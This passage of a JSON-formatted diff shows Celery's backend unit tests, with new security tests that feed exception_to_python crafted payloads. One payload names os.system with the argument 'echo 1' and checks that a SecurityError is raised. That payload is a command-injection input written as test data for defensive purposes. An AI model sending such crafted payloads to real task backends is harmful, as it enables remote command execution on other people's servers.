                "PatchRowcode": " "
            },
            "15": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 585,
                "PatchRowcode": "+    def test_not_an_actual_exc_info(self):"
            },
            "16": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 586,
                "PatchRowcode": "+        pass"
            },
            "17": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 587,
                "PatchRowcode": "+"
            },
            "18": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 588,
                "PatchRowcode": "+    def test_not_an_exception_but_a_callable(self):"
            },
            "19": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 589,
                "PatchRowcode": "+        x = {"
            },
            "20": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 590,
                "PatchRowcode": "+            'exc_message': ('echo 1',),"
            },
            "21": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 591,
                "PatchRowcode": "+            'exc_type': 'system',"
            },
            "22": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 592,
                "PatchRowcode": "+            'exc_module': 'os'"
            },
            "23": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 593,
                "PatchRowcode": "+        }"
            },
            "24": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 594,
                "PatchRowcode": "+"
            },
            "25": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 595,
                "PatchRowcode": "+        with pytest.raises(SecurityError,"
            },
            "26": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 596,
                "PatchRowcode": "+                           match=re.escape(r\"Expected an exception class, got os.system with payload ('echo 1',)\")):"
            },
            "27": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 597,
                "PatchRowcode": "+            self.b.exception_to_python(x)"
            },
            "28": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 598,
                "PatchRowcode": "+"
            },
            "29": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 599,
                "PatchRowcode": "+    def test_not_an_exception_but_another_object(self):"
            },
            "30": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 600,
                "PatchRowcode": "+        x = {"
            },
            "31": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 601,
                "PatchRowcode": "+            'exc_message': (),"
            },
            "32": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 602,
                "PatchRowcode": "+            'exc_type': 'object',"
            },
            "33": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 603,
                "PatchRowcode": "+            'exc_module': 'builtins'"
            },
            "34": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 604,
                "PatchRowcode": "+        }"
            },
            "35": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 605,
                "PatchRowcode": "+"
            },
            "36": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 606,
                "PatchRowcode": "+        with pytest.raises(SecurityError,"
            },
            "37": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 607,
                "PatchRowcode": "+                           match=re.escape(r\"Expected an exception class, got builtins.object with payload ()\")):"
            },
            "38": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 608,
                "PatchRowcode": "+            self.b.exception_to_python(x)"
            },
            "39": {
                "beforePatchRowNumber": "",
                "afterPatchRowNumber": 609,
                "PatchRowcode": "+"
            },
            "40": {
                "beforePatchRowNumber": 584,
                "afterPatchRowNumber": 610,
                "PatchRowcode": "     def test_exception_to_python_when_attribute_exception(self):"
            },
            "41": {
                "beforePatchRowNumber": 585,
                "afterPatchRowNumber": 611,
                "PatchRowcode": "         b = BaseBackend(app=self.app)"
            },
            "42": {
                "beforePatchRowNumber": 586,
                "afterPatchRowNumber": 612,
                "PatchRowcode": "         test_exception = {'exc_type': 'AttributeDoesNotExist',"
            }
        },
        "frontPatchFile": [
            "from contextlib import contextmanager",
            "from unittest.mock import ANY, MagicMock, Mock, call, patch, sentinel",
            "",
            "import pytest",
            "from kombu.serialization import prepare_accept_content",
            "from kombu.utils.encoding import ensure_bytes",
            "",
            "import celery",
            "from celery import chord, group, signature, states, uuid",
            "from celery.app.task import Context, Task",
            "from celery.backends.base import (BaseBackend, DisabledBackend,",
            "                                  KeyValueStoreBackend, _nulldict)",
            "from celery.exceptions import (BackendGetMetaError, BackendStoreError,",
            "                               ChordError, TimeoutError)",
            "from celery.result import result_from_tuple",
            "from celery.utils import serialization",
            "from celery.utils.functional import pass1",
            "from celery.utils.serialization import UnpickleableExceptionWrapper",
            "from celery.utils.serialization import find_pickleable_exception as fnpe",
            "from celery.utils.serialization import get_pickleable_exception as gpe",
            "from celery.utils.serialization import subclass_exception",
            "",
            "",
            "class wrapobject:",
            "",
            "    def __init__(self, *args, **kwargs):",
            "        self.args = args",
            "",
            "",
            "class paramexception(Exception):",
            "",
            "    def __init__(self, param):",
            "        self.param = param",
            "",
            "",
            "class objectexception:",
            "    class Nested(Exception):",
            "        pass",
            "",
            "",
            "Oldstyle = None",
            "",
            "Unpickleable = subclass_exception(",
            "    'Unpickleable', KeyError, 'foo.module',",
            ")",
            "Impossible = subclass_exception(",
            "    'Impossible', object, 'foo.module',",
            ")",
            "Lookalike = subclass_exception(",
            "    'Lookalike', wrapobject, 'foo.module',",
            ")",
            "",
            "",
            "class test_nulldict:",
            "",
            "    def test_nulldict(self):",
            "        x = _nulldict()",
            "        x['foo'] = 1",
            "        x.update(foo=1, bar=2)",
            "        x.setdefault('foo', 3)",
            "",
            "",
            "class test_serialization:",
            "",
            "    def test_create_exception_cls(self):",
            "        assert serialization.create_exception_cls('FooError', 'm')",
            "        assert serialization.create_exception_cls('FooError', 'm', KeyError)",
            "",
            "",
            "class test_Backend_interface:",
            "",
            "    def setup(self):",
            "        self.app.conf.accept_content = ['json']",
            "",
            "    def test_accept_precedence(self):",
            "",
            "        # default is app.conf.accept_content",
            "        accept_content = self.app.conf.accept_content",
            "        b1 = BaseBackend(self.app)",
            "        assert prepare_accept_content(accept_content) == b1.accept",
            "",
            "        # accept parameter",
            "        b2 = BaseBackend(self.app, accept=['yaml'])",
            "        assert len(b2.accept) == 1",
            "        assert list(b2.accept)[0] == 'application/x-yaml'",
            "        assert prepare_accept_content(['yaml']) == b2.accept",
            "",
            "        # accept parameter over result_accept_content",
            "        self.app.conf.result_accept_content = ['json']",
            "        b3 = BaseBackend(self.app, accept=['yaml'])",
            "        assert len(b3.accept) == 1",
            "        assert list(b3.accept)[0] == 'application/x-yaml'",
            "        assert prepare_accept_content(['yaml']) == b3.accept",
            "",
            "        # conf.result_accept_content if specified",
            "        self.app.conf.result_accept_content = ['yaml']",
            "        b4 = BaseBackend(self.app)",
            "        assert len(b4.accept) == 1",
            "        assert list(b4.accept)[0] == 'application/x-yaml'",
            "        assert prepare_accept_content(['yaml']) == b4.accept",
            "",
            "    def test_get_result_meta(self):",
            "        b1 = BaseBackend(self.app)",
            "        meta = b1._get_result_meta(result={'fizz': 'buzz'},",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=None)",
            "        assert meta['status'] == states.SUCCESS",
            "        assert meta['result'] == {'fizz': 'buzz'}",
            "        assert meta['traceback'] is None",
            "",
            "        self.app.conf.result_extended = True",
            "        args = ['a', 'b']",
            "        kwargs = {'foo': 'bar'}",
            "        task_name = 'mytask'",
            "",
            "        b2 = BaseBackend(self.app)",
            "        request = Context(args=args, kwargs=kwargs,",
            "                          task=task_name,",
            "                          delivery_info={'routing_key': 'celery'})",
            "        meta = b2._get_result_meta(result={'fizz': 'buzz'},",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=request, encode=False)",
            "        assert meta['name'] == task_name",
            "        assert meta['args'] == args",
            "        assert meta['kwargs'] == kwargs",
            "        assert meta['queue'] == 'celery'",
            "",
            "    def test_get_result_meta_encoded(self):",
            "        self.app.conf.result_extended = True",
            "        b1 = BaseBackend(self.app)",
            "        args = ['a', 'b']",
            "        kwargs = {'foo': 'bar'}",
            "",
            "        request = Context(args=args, kwargs=kwargs)",
            "        meta = b1._get_result_meta(result={'fizz': 'buzz'},",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=request, encode=True)",
            "        assert meta['args'] == ensure_bytes(b1.encode(args))",
            "        assert meta['kwargs'] == ensure_bytes(b1.encode(kwargs))",
            "",
            "    def test_get_result_meta_with_none(self):",
            "        b1 = BaseBackend(self.app)",
            "        meta = b1._get_result_meta(result=None,",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=None)",
            "        assert meta['status'] == states.SUCCESS",
            "        assert meta['result'] is None",
            "        assert meta['traceback'] is None",
            "",
            "        self.app.conf.result_extended = True",
            "        args = ['a', 'b']",
            "        kwargs = {'foo': 'bar'}",
            "        task_name = 'mytask'",
            "",
            "        b2 = BaseBackend(self.app)",
            "        request = Context(args=args, kwargs=kwargs,",
            "                          task=task_name,",
            "                          delivery_info={'routing_key': 'celery'})",
            "        meta = b2._get_result_meta(result=None,",
            "                                   state=states.SUCCESS, traceback=None,",
            "                                   request=request, encode=False)",
            "        assert meta['name'] == task_name",
            "        assert meta['args'] == args",
            "        assert meta['kwargs'] == kwargs",
            "        assert meta['queue'] == 'celery'",
            "",
            "",
            "class test_BaseBackend_interface:",
            "",
            "    def setup(self):",
            "        self.b = BaseBackend(self.app)",
            "",
            "        @self.app.task(shared=False)",
            "        def callback(result):",
            "            pass",
            "",
            "        self.callback = callback",
            "",
            "    def test__forget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            self.b._forget('SOMExx-N0Nex1stant-IDxx-')",
            "",
            "    def test_forget(self):",
            "        with pytest.raises(NotImplementedError):",
            "            self.b.forget('SOMExx-N0nex1stant-IDxx-')",
            "",
            "    def test_on_chord_part_return(self):",
            "        self.b.on_chord_part_return(None, None, None)",
            "",
            "    def test_apply_chord(self, unlock='celery.chord_unlock'):",
            "        self.app.tasks[unlock] = Mock()",
            "        header_result_args = (",
            "            uuid(),",
            "            [self.app.AsyncResult(x) for x in range(3)],",
            "        )",
            "        self.b.apply_chord(header_result_args, self.callback.s())",
            "        assert self.app.tasks[unlock].apply_async.call_count",
            "",
            "    def test_chord_unlock_queue(self, unlock='celery.chord_unlock'):",
            "        self.app.tasks[unlock] = Mock()",
            "        header_result_args = (",
            "            uuid(),",
            "            [self.app.AsyncResult(x) for x in range(3)],",
            "        )",
            "        body = self.callback.s()",
            "",
            "        self.b.apply_chord(header_result_args, body)",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs['queue'] == 'testcelery'",
            "",
            "        routing_queue = Mock()",
            "        routing_queue.name = \"routing_queue\"",
            "        self.app.amqp.router.route = Mock(return_value={",
            "            \"queue\": routing_queue",
            "        })",
            "        self.b.apply_chord(header_result_args, body)",
            "        assert self.app.amqp.router.route.call_args[0][1] == body.name",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs[\"queue\"] == \"routing_queue\"",
            "",
            "        self.b.apply_chord(header_result_args, body.set(queue='test_queue'))",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs['queue'] == 'test_queue'",
            "",
            "        @self.app.task(shared=False, queue='test_queue_two')",
            "        def callback_queue(result):",
            "            pass",
            "",
            "        self.b.apply_chord(header_result_args, callback_queue.s())",
            "        called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "        assert called_kwargs['queue'] == 'test_queue_two'",
            "",
            "        with self.Celery() as app2:",
            "            @app2.task(name='callback_different_app', shared=False)",
            "            def callback_different_app(result):",
            "                pass",
            "",
            "            callback_different_app_signature = self.app.signature('callback_different_app')",
            "            self.b.apply_chord(header_result_args, callback_different_app_signature)",
            "            called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "            assert called_kwargs['queue'] == 'routing_queue'",
            "",
            "            callback_different_app_signature.set(queue='test_queue_three')",
            "            self.b.apply_chord(header_result_args, callback_different_app_signature)",
            "            called_kwargs = self.app.tasks[unlock].apply_async.call_args[1]",
            "            assert called_kwargs['queue'] == 'test_queue_three'",
            "",
            "",
            "class test_exception_pickle:",
            "    def test_BaseException(self):",
            "        assert fnpe(Exception()) is None",
            "",
            "    def test_get_pickleable_exception(self):",
            "        exc = Exception('foo')",
            "        assert gpe(exc) == exc",
            "",
            "    def test_unpickleable(self):",
            "        assert isinstance(fnpe(Unpickleable()), KeyError)",
            "        assert fnpe(Impossible()) is None",
            "",
            "",
            "class test_prepare_exception:",
            "",
            "    def setup(self):",
            "        self.b = BaseBackend(self.app)",
            "",
            "    def test_unpickleable(self):",
            "        self.b.serializer = 'pickle'",
            "        x = self.b.prepare_exception(Unpickleable(1, 2, 'foo'))",
            "        assert isinstance(x, KeyError)",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, KeyError)",
            "",
            "    def test_json_exception_arguments(self):",
            "        self.b.serializer = 'json'",
            "        x = self.b.prepare_exception(Exception(object))",
            "        assert x == {",
            "            'exc_message': serialization.ensure_serializable(",
            "                (object,), self.b.encode),",
            "            'exc_type': Exception.__name__,",
            "            'exc_module': Exception.__module__}",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, Exception)",
            "",
            "    def test_json_exception_nested(self):",
            "        self.b.serializer = 'json'",
            "        x = self.b.prepare_exception(objectexception.Nested('msg'))",
            "        assert x == {",
            "            'exc_message': ('msg',),",
            "            'exc_type': 'objectexception.Nested',",
            "            'exc_module': objectexception.Nested.__module__}",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, objectexception.Nested)",
            "",
            "    def test_impossible(self):",
            "        self.b.serializer = 'pickle'",
            "        x = self.b.prepare_exception(Impossible())",
            "        assert isinstance(x, UnpickleableExceptionWrapper)",
            "        assert str(x)",
            "        y = self.b.exception_to_python(x)",
            "        assert y.__class__.__name__ == 'Impossible'",
            "        assert y.__class__.__module__ == 'foo.module'",
            "",
            "    def test_regular(self):",
            "        self.b.serializer = 'pickle'",
            "        x = self.b.prepare_exception(KeyError('baz'))",
            "        assert isinstance(x, KeyError)",
            "        y = self.b.exception_to_python(x)",
            "        assert isinstance(y, KeyError)",
            "",
            "    def test_unicode_message(self):",
            "        message = '\\u03ac'",
            "        x = self.b.prepare_exception(Exception(message))",
            "        assert x == {'exc_message': (message,),",
            "                     'exc_type': Exception.__name__,",
            "                     'exc_module': Exception.__module__}",
            "",
            "",
            "class KVBackend(KeyValueStoreBackend):",
            "    mget_returns_dict = False",
            "",
            "    def __init__(self, app, *args, **kwargs):",
            "        self.db = {}",
            "        super().__init__(app, *args, **kwargs)",
            "",
            "    def get(self, key):",
            "        return self.db.get(key)",
            "",
            "    def _set_with_state(self, key, value, state):",
            "        self.db[key] = value",
            "",
            "    def mget(self, keys):",
            "        if self.mget_returns_dict:",
            "            return {key: self.get(key) for key in keys}",
            "        else:",
            "            return [self.get(k) for k in keys]",
            "",
            "    def delete(self, key):",
            "        self.db.pop(key, None)",
            "",
            "",
            "class DictBackend(BaseBackend):",
            "",
            "    def __init__(self, *args, **kwargs):",
            "        super().__init__(*args, **kwargs)",
            "        self._data = {'can-delete': {'result': 'foo'}}",
            "",
            "    def _restore_group(self, group_id):",
            "        if group_id == 'exists':",
            "            return {'result': 'group'}",
            "",
            "    def _get_task_meta_for(self, task_id):",
            "        if task_id == 'task-exists':",
            "            return {'result': 'task'}",
            "",
            "    def _delete_group(self, group_id):",
            "        self._data.pop(group_id, None)",
            "",
            "",
            "class test_BaseBackend_dict:",
            "",
            "    def setup(self):",
            "        self.b = DictBackend(app=self.app)",
            "",
            "        @self.app.task(shared=False, bind=True)",
            "        def bound_errback(self, result):",
            "            pass",
            "",
            "        @self.app.task(shared=False)",
            "        def errback(arg1, arg2):",
            "            errback.last_result = arg1 + arg2",
            "",
            "        self.bound_errback = bound_errback",
            "        self.errback = errback",
            "",
            "    def test_delete_group(self):",
            "        self.b.delete_group('can-delete')",
            "        assert 'can-delete' not in self.b._data",
            "",
            "    def test_prepare_exception_json(self):",
            "        x = DictBackend(self.app, serializer='json')",
            "        e = x.prepare_exception(KeyError('foo'))",
            "        assert 'exc_type' in e",
            "        e = x.exception_to_python(e)",
            "        assert e.__class__.__name__ == 'KeyError'",
            "        assert str(e).strip('u') == \"'foo'\"",
            "",
            "    def test_save_group(self):",
            "        b = BaseBackend(self.app)",
            "        b._save_group = Mock()",
            "        b.save_group('foofoo', 'xxx')",
            "        b._save_group.assert_called_with('foofoo', 'xxx')",
            "",
            "    def test_add_to_chord_interface(self):",
            "        b = BaseBackend(self.app)",
            "        with pytest.raises(NotImplementedError):",
            "            b.add_to_chord('group_id', 'sig')",
            "",
            "    def test_forget_interface(self):",
            "        b = BaseBackend(self.app)",
            "        with pytest.raises(NotImplementedError):",
            "            b.forget('foo')",
            "",
            "    def test_restore_group(self):",
            "        assert self.b.restore_group('missing') is None",
            "        assert self.b.restore_group('missing') is None",
            "        assert self.b.restore_group('exists') == 'group'",
            "        assert self.b.restore_group('exists') == 'group'",
            "        assert self.b.restore_group('exists', cache=False) == 'group'",
            "",
            "    def test_reload_group_result(self):",
            "        self.b._cache = {}",
            "        self.b.reload_group_result('exists')",
            "        self.b._cache['exists'] = {'result': 'group'}",
            "",
            "    def test_reload_task_result(self):",
            "        self.b._cache = {}",
            "        self.b.reload_task_result('task-exists')",
            "        self.b._cache['task-exists'] = {'result': 'task'}",
            "",
            "    def test_fail_from_current_stack(self):",
            "        import inspect",
            "        self.b.mark_as_failure = Mock()",
            "        frame_list = []",
            "",
            "        def raise_dummy():",
            "            frame_str_temp = str(inspect.currentframe().__repr__)",
            "            frame_list.append(frame_str_temp)",
            "            raise KeyError('foo')",
            "        try:",
            "            raise_dummy()",
            "        except KeyError as exc:",
            "            self.b.fail_from_current_stack('task_id')",
            "            self.b.mark_as_failure.assert_called()",
            "            args = self.b.mark_as_failure.call_args[0]",
            "            assert args[0] == 'task_id'",
            "            assert args[1] is exc",
            "            assert args[2]",
            "",
            "            tb_ = exc.__traceback__",
            "            while tb_ is not None:",
            "                if str(tb_.tb_frame.__repr__) == frame_list[0]:",
            "                    assert len(tb_.tb_frame.f_locals) == 0",
            "                tb_ = tb_.tb_next",
            "",
            "    def test_prepare_value_serializes_group_result(self):",
            "        self.b.serializer = 'json'",
            "        g = self.app.GroupResult('group_id', [self.app.AsyncResult('foo')])",
            "        v = self.b.prepare_value(g)",
            "        assert isinstance(v, (list, tuple))",
            "        assert result_from_tuple(v, app=self.app) == g",
            "",
            "        v2 = self.b.prepare_value(g[0])",
            "        assert isinstance(v2, (list, tuple))",
            "        assert result_from_tuple(v2, app=self.app) == g[0]",
            "",
            "        self.b.serializer = 'pickle'",
            "        assert isinstance(self.b.prepare_value(g), self.app.GroupResult)",
            "",
            "    def test_is_cached(self):",
            "        b = BaseBackend(app=self.app, max_cached_results=1)",
            "        b._cache['foo'] = 1",
            "        assert b.is_cached('foo')",
            "        assert not b.is_cached('false')",
            "",
            "    def test_mark_as_done__chord(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        b.on_chord_part_return = Mock()",
            "        b.mark_as_done('id', 10, request=request)",
            "        b.on_chord_part_return.assert_called_with(request, states.SUCCESS, 10)",
            "",
            "    def test_mark_as_failure__bound_errback_eager(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.delivery_info = {",
            "            'is_eager': True",
            "        }",
            "        request.errbacks = [",
            "            self.bound_errback.subtask(args=[1], immutable=True)]",
            "        exc = KeyError()",
            "        group = self.patching('celery.backends.base.group')",
            "        b.mark_as_failure('id', exc, request=request)",
            "        group.assert_called_with(request.errbacks, app=self.app)",
            "        group.return_value.apply.assert_called_with(",
            "            (request.id, ), parent_id=request.id, root_id=request.root_id)",
            "",
            "    def test_mark_as_failure__bound_errback(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.delivery_info = {}",
            "        request.errbacks = [",
            "            self.bound_errback.subtask(args=[1], immutable=True)]",
            "        exc = KeyError()",
            "        group = self.patching('celery.backends.base.group')",
            "        b.mark_as_failure('id', exc, request=request)",
            "        group.assert_called_with(request.errbacks, app=self.app)",
            "        group.return_value.apply_async.assert_called_with(",
            "            (request.id, ), parent_id=request.id, root_id=request.root_id)",
            "",
            "    def test_mark_as_failure__errback(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.errbacks = [self.errback.subtask(args=[2, 3], immutable=True)]",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        assert self.errback.last_result == 5",
            "",
            "    @patch('celery.backends.base.group')",
            "    def test_class_based_task_can_be_used_as_error_callback(self, mock_group):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "",
            "        class TaskBasedClass(Task):",
            "            def run(self):",
            "                pass",
            "",
            "        TaskBasedClass = self.app.register_task(TaskBasedClass())",
            "",
            "        request = Mock(name='request')",
            "        request.errbacks = [TaskBasedClass.subtask(args=[], immutable=True)]",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        mock_group.assert_called_once_with(request.errbacks, app=self.app)",
            "",
            "    @patch('celery.backends.base.group')",
            "    def test_unregistered_task_can_be_used_as_error_callback(self, mock_group):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "",
            "        request = Mock(name='request')",
            "        request.errbacks = [signature('doesnotexist',",
            "                                      immutable=True)]",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        mock_group.assert_called_once_with(request.errbacks, app=self.app)",
            "",
            "    def test_mark_as_failure__chord(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.errbacks = []",
            "        b.on_chord_part_return = Mock()",
            "        exc = KeyError()",
            "        b.mark_as_failure('id', exc, request=request)",
            "        b.on_chord_part_return.assert_called_with(request, states.FAILURE, exc)",
            "",
            "    def test_mark_as_revoked__chord(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._store_result = Mock()",
            "        request = Mock(name='request')",
            "        request.errbacks = []",
            "        b.on_chord_part_return = Mock()",
            "        b.mark_as_revoked('id', 'revoked', request=request)",
            "        b.on_chord_part_return.assert_called_with(request, states.REVOKED, ANY)",
            "",
            "    def test_chord_error_from_stack_raises(self):",
            "        class ExpectedException(Exception):",
            "            pass",
            "",
            "        b = BaseBackend(app=self.app)",
            "        callback = MagicMock(name='callback')",
            "        callback.options = {'link_error': []}",
            "        callback.keys.return_value = []",
            "        task = self.app.tasks[callback.task] = Mock()",
            "        b.fail_from_current_stack = Mock()",
            "        self.patching('celery.group')",
            "        with patch.object(",
            "            b, \"_call_task_errbacks\", side_effect=ExpectedException()",
            "        ) as mock_call_errbacks:",
            "            b.chord_error_from_stack(callback, exc=ValueError())",
            "        task.backend.fail_from_current_stack.assert_called_with(",
            "            callback.id, exc=mock_call_errbacks.side_effect,",
            "        )",
            "",
            "    def test_exception_to_python_when_None(self):",
            "        b = BaseBackend(app=self.app)",
            "        assert b.exception_to_python(None) is None",
            "",
            "    def test_exception_to_python_when_attribute_exception(self):",
            "        b = BaseBackend(app=self.app)",
            "        test_exception = {'exc_type': 'AttributeDoesNotExist',",
            "                          'exc_module': 'celery',",
            "                          'exc_message': ['Raise Custom Message']}",
            "",
            "        result_exc = b.exception_to_python(test_exception)",
            "        assert str(result_exc) == 'Raise Custom Message'",
            "",
            "    def test_exception_to_python_when_type_error(self):",
            "        b = BaseBackend(app=self.app)",
            "        celery.TestParamException = paramexception",
            "        test_exception = {'exc_type': 'TestParamException',",
            "                          'exc_module': 'celery',",
            "                          'exc_message': []}",
            "",
            "        result_exc = b.exception_to_python(test_exception)",
            "        del celery.TestParamException",
            "        assert str(result_exc) == \"<class 't.unit.backends.test_base.paramexception'>([])\"",
            "",
            "    def test_wait_for__on_interval(self):",
            "        self.patching('time.sleep')",
            "        b = BaseBackend(app=self.app)",
            "        b._get_task_meta_for = Mock()",
            "        b._get_task_meta_for.return_value = {'status': states.PENDING}",
            "        callback = Mock(name='callback')",
            "        with pytest.raises(TimeoutError):",
            "            b.wait_for(task_id='1', on_interval=callback, timeout=1)",
            "        callback.assert_called_with()",
            "",
            "        b._get_task_meta_for.return_value = {'status': states.SUCCESS}",
            "        b.wait_for(task_id='1', timeout=None)",
            "",
            "    def test_get_children(self):",
            "        b = BaseBackend(app=self.app)",
            "        b._get_task_meta_for = Mock()",
            "        b._get_task_meta_for.return_value = {}",
            "        assert b.get_children('id') is None",
            "        b._get_task_meta_for.return_value = {'children': 3}",
            "        assert b.get_children('id') == 3",
            "",
            "",
            "class test_KeyValueStoreBackend:",
            "",
            "    def setup(self):",
            "        self.b = KVBackend(app=self.app)",
            "",
            "    def test_on_chord_part_return(self):",
            "        assert not self.b.implements_incr",
            "        self.b.on_chord_part_return(None, None, None)",
            "",
            "    def test_get_store_delete_result(self):",
            "        tid = uuid()",
            "        self.b.mark_as_done(tid, 'Hello world')",
            "        assert self.b.get_result(tid) == 'Hello world'",
            "        assert self.b.get_state(tid) == states.SUCCESS",
            "        self.b.forget(tid)",
            "        assert self.b.get_state(tid) == states.PENDING",
            "",
            "    @pytest.mark.parametrize('serializer',",
            "                             ['json', 'pickle', 'yaml', 'msgpack'])",
            "    def test_store_result_parent_id(self, serializer):",
            "        self.app.conf.accept_content = ('json', serializer)",
            "        self.b = KVBackend(app=self.app, serializer=serializer)",
            "        tid = uuid()",
            "        pid = uuid()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        request = Context(parent_id=pid)",
            "        self.b.store_result(",
            "            tid, state=state, result=result, request=request,",
            "        )",
            "        stored_meta = self.b.decode(self.b.get(self.b.get_key_for_task(tid)))",
            "        assert stored_meta['parent_id'] == request.parent_id",
            "",
            "    def test_store_result_group_id(self):",
            "        tid = uuid()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        request = Context(group='gid', children=[])",
            "        self.b.store_result(",
            "            tid, state=state, result=result, request=request,",
            "        )",
            "        stored_meta = self.b.decode(self.b.get(self.b.get_key_for_task(tid)))",
            "        assert stored_meta['group_id'] == request.group",
            "",
            "    def test_store_result_race_second_write_should_ignore_if_previous_success(self):",
            "        tid = uuid()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        request = Context(group='gid', children=[])",
            "        self.b.store_result(",
            "            tid, state=state, result=result, request=request,",
            "        )",
            "        self.b.store_result(",
            "            tid, state=states.FAILURE, result=result, request=request,",
            "        )",
            "        stored_meta = self.b.decode(self.b.get(self.b.get_key_for_task(tid)))",
            "        assert stored_meta['status'] == states.SUCCESS",
            "",
            "    def test_strip_prefix(self):",
            "        x = self.b.get_key_for_task('x1b34')",
            "        assert self.b._strip_prefix(x) == 'x1b34'",
            "        assert self.b._strip_prefix('x1b34') == 'x1b34'",
            "",
            "    def test_get_many(self):",
            "        for is_dict in True, False:",
            "            self.b.mget_returns_dict = is_dict",
            "            ids = {uuid(): i for i in range(10)}",
            "            for id, i in ids.items():",
            "                self.b.mark_as_done(id, i)",
            "            it = self.b.get_many(list(ids), interval=0.01)",
            "            for i, (got_id, got_state) in enumerate(it):",
            "                assert got_state['result'] == ids[got_id]",
            "            assert i == 9",
            "            assert list(self.b.get_many(list(ids), interval=0.01))",
            "",
            "            self.b._cache.clear()",
            "            callback = Mock(name='callback')",
            "            it = self.b.get_many(",
            "                list(ids),",
            "                on_message=callback,",
            "                interval=0.05",
            "            )",
            "            for i, (got_id, got_state) in enumerate(it):",
            "                assert got_state['result'] == ids[got_id]",
            "            assert i == 9",
            "            assert list(",
            "                self.b.get_many(list(ids), interval=0.01)",
            "            )",
            "            callback.assert_has_calls([",
            "                call(ANY) for id in ids",
            "            ])",
            "",
            "    def test_get_many_times_out(self):",
            "        tasks = [uuid() for _ in range(4)]",
            "        self.b._cache[tasks[1]] = {'status': 'PENDING'}",
            "        with pytest.raises(self.b.TimeoutError):",
            "            list(self.b.get_many(tasks, timeout=0.01, interval=0.01))",
            "",
            "    def test_get_many_passes_ready_states(self):",
            "        tasks_length = 10",
            "        ready_states = frozenset({states.SUCCESS})",
            "",
            "        self.b._cache.clear()",
            "        ids = {uuid(): i for i in range(tasks_length)}",
            "        for id, i in ids.items():",
            "            if i % 2 == 0:",
            "                self.b.mark_as_done(id, i)",
            "            else:",
            "                self.b.mark_as_failure(id, Exception())",
            "",
            "        it = self.b.get_many(list(ids), interval=0.01, max_iterations=1, READY_STATES=ready_states)",
            "        it_list = list(it)",
            "",
            "        assert all([got_state['status'] in ready_states for (got_id, got_state) in it_list])",
            "        assert len(it_list) == tasks_length / 2",
            "",
            "    def test_chord_part_return_no_gid(self):",
            "        self.b.implements_incr = True",
            "        task = Mock()",
            "        state = 'SUCCESS'",
            "        result = 10",
            "        task.request.group = None",
            "        self.b.get_key_for_chord = Mock()",
            "        self.b.get_key_for_chord.side_effect = AssertionError(",
            "            'should not get here',",
            "        )",
            "        assert self.b.on_chord_part_return(",
            "            task.request, state, result) is None",
            "",
            "    @patch('celery.backends.base.GroupResult')",
            "    @patch('celery.backends.base.maybe_signature')",
            "    def test_chord_part_return_restore_raises(self, maybe_signature,",
            "                                              GroupResult):",
            "        self.b.implements_incr = True",
            "        GroupResult.restore.side_effect = KeyError()",
            "        self.b.chord_error_from_stack = Mock()",
            "        callback = Mock(name='callback')",
            "        request = Mock(name='request')",
            "        request.group = 'gid'",
            "        maybe_signature.return_value = callback",
            "        self.b.on_chord_part_return(request, states.SUCCESS, 10)",
            "        self.b.chord_error_from_stack.assert_called_with(",
            "            callback, ANY,",
            "        )",
            "",
